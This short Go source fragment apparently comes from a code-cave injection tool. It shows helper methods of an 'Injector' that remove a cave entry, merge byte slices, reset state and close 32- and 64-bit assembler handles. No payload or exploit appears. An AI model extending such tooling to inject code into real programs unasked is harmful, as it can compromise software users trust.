func (inj *Injector) removeCodeCave(i int) {
	inj.caves = append(inj.caves[:i], inj.caves[i+1:]...)
}

func mergeBytes(b [][]byte) []byte {
	var o []byte
	for i := 0; i < len(b); i++ {
		o = append(o, b[i]...)
	}
	return o
}

func (inj *Injector) cleanup() {
	n := Injector{
		ase32: inj.ase32,
		ase64: inj.ase64,
		rand:  inj.rand,
		igir:  inj.igir,
	}
	*inj = n
}

// Close is used to close injector.
func (inj *Injector) Close() error {
	if inj.ase32 != nil {
		err := inj.ase32.Close()
		if err != nil {
			return err
		}
	}
	if inj.ase64 != nil {
		err := inj.ase64.Close()
		if err != nil {
			return err
		}
	}
	return nil
}
